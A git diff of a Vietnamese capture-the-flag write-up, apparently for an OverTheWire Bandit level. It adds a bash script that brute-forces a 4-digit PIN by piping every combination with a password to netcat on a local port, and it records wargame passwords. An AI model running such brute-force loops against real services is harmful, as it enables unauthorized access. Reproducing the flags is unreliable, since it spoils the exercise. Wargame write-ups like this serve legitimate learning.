@@ -13,18 +13,34 @@ Bạn không cần phải tạo kết nối mới mỗi lần.
 
 ---
 
-## Cộng cụ
-
-1. **netcat (nc)**
-
----
-
 
 ## 🛠️ Cách giải
-1. 
+
+1. chuyển vào thư mục tạm `tmp` tạo file `basher.sh`
+
+```
+cd /tmp/
+nano basher.sh
+```
+
+2. Viết code sau để tấn công brute-force
+
+```
+#!/bin/bash
+
+pass="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
+
+for pin in $(seq -w 0000 9999); do
+    echo "$pass $pin"
+done | nc localhost 30002
+```
+
+- Vì kết nối chỉ kéo dài khoảng vài giấy nên mỗi lần quét ta tăng giá trị lên tầm `1000`
+
+
 
 ## 🏁 Password
 
 ```
-gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
 ```
